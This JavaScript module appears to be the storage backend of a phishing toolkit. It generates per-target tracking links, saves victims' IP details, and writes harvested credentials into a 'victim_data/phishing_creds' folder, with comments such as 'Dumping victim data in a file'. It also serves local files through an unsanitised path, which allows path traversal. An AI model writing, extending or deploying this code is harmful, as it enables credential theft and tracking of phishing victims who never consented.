const fs= require('fs');
const path = require('path');
const token = require('./token');

exports.writeToFile = function(url,file_write_callback){
	token.showAllTokens(function show_all_callback(result){
		for (var token of Object.keys(result)){
			fs.appendFile('links.txt', `${url}/?id=${token}\n`, function (err) {
				if (err) throw err;
			});
		}
		file_write_callback(1)
	});
};

exports.deleteFileContent = function(file_delete_callback){
	fs.writeFile('links.txt',"", function (err) {
		if (err) throw err;
		file_delete_callback(1);
	});
};


exports.storeIpInfo = function(ip_data){
	//Dumping victim data in a file
	fs.writeFile(`./victim_data/ip_info/${ip_data.ip}.json`,JSON.stringify(ip_data,null,2), function (err) {
		if (err) throw err;
	});
};

exports.storeCreds = function(creds){
	var date = String(Date());
	fs.writeFile(`${__dirname}/victim_data/phishing_creds/ip_${creds[1]}_date_${date}.json`, JSON.stringify(creds[0]), function (err) {
		if (err) console.log(err);//throw err;
		else console.log(`Info:Creds for ${creds[1]} stored at ${__dirname}/victim_data/phishing_creds/${creds[1]}_${date}.json`);
	});
};


exports.serve_local_file = function(local_path,reply){
	//https://stackoverflow.com/q/16333790/
	var filePath = __dirname+local_path;
	var extname = path.extname(filePath);
    	var contentType = 'text/html';

    	switch (extname) {
	        case '.js':
	            contentType = 'text/javascript';
	            break;
	        case '.css':
	            contentType = 'text/css';
	            break;
	        case '.json':
	            contentType = 'application/json';
	            break;
	        case '.png':
	            contentType = 'image/png';
	            break;      
	        case '.jpg':
	            contentType = 'image/jpg';
	            break;
	        case '.wav':
	            contentType = 'audio/wav';
	            break;
	}

	fs.readFile(filePath, function(error, content) {
		if (error) {
			if(error.code == 'ENOENT'){
				console.log("Error:ENOENT Error",filePath);
				reply('redirect');
			}

            		else {
                		console.log('Erro:Some error while serving file: '+error.code+' ..\n');
				reply('redirect');
            		}
        	}
        	else {
	      		reply([200, { 'Content-Type': contentType },content]);
        	}
    	});
}


